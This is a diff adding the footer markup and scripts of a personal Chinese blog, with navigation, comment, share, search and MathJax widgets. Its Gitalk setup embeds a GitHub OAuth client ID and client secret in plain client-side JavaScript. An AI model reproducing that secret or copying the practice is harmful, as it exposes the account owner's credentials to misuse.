+        <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+        我的网站的访问总数:<span id="busuanzi_value_site_pv"></span>次
+        </span>
+      </div>
+
+      
+    </div>
+  </div>
+
+</footer>
+
+  </div>
+  <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
+  
+    <a href="/archives" class="mobile-nav-link"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
+  
+    <a href="/about" class="mobile-nav-link"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
+  
+    <a href="/comments" class="mobile-nav-link"><i class="fa fa-comments" aria-hidden="true"></i>留言</a>
+  
+    <a href="/404.html" class="mobile-nav-link"><i class="fa fa-heart" aria-hidden="true"></i>公益404</a>
+  
+</nav>
+
+  <!-- totop start -->
+<div id="totop">
+<a title="返回顶部"><img src="/img/betop.png"/></a>
+</div>
+
+<!-- totop end -->
+
+
+
+  <script>
+    const gitalk = new Gitalk({
+      clientID: "992fba235eb173826494",
+      clientSecret: "d133f6427763be2cf4048e4d146a22043e745f22",
+      repo: "pa55w0rd.github.io",
+      owner: "Pa55w0rd",
+      admin: "Pa55w0rd",
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: "Mon Oct 29 2018 11:46:20 GMT+0800",      // Ensure uniqueness and length less than 50
+      distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+  </script>
+
+
+
+
+<!-- 百度分享 start -->
+
+<div id="article-share-box" class="article-share-box">
+  <div id="bdshare" class="bdsharebuttonbox article-share-links">
+    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
+    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
+    <a class="article-share-more" data-cmd="more" title="更多"></a>
+  </div>
+</div>
+<script>
+  function SetShareData(cmd, config) {
+    if (shareDataTitle && shareDataUrl) {
+      config.bdText = shareDataTitle;
+      config.bdUrl = shareDataUrl;
+    }
+    return config;
+  }
+  window._bd_share_config={
+    "common":{onBeforeClick: SetShareData},
+    "share":{"bdCustomStyle":"/css/bdshare.css"}
+  };
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+
+<!-- 百度分享 end -->
+
+<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
+<script src="https://cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>
+
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<! -- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+                processEscapes: true
+                    
+}
+  
+        });
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+tex2jax: {
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+                  
+}
+    
+        });
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Queue(function() {
+            var all = MathJax.Hub.getAllJax(), i;
+            for(i=0; i < all.length; i += 1) {
+                            all[i].SourceElement().parentNode.className += ' has-jax';
+                                    
+            }
+                
+        });
+</script>
+
+<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+</div>
+</body>
+</html>
+
+
+
+<div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+</div>
+
+
+<script>
+$(document).ready(function(){
+window.scrollReveal = new scrollReveal({ reset: true});
+//
+})
+</script>
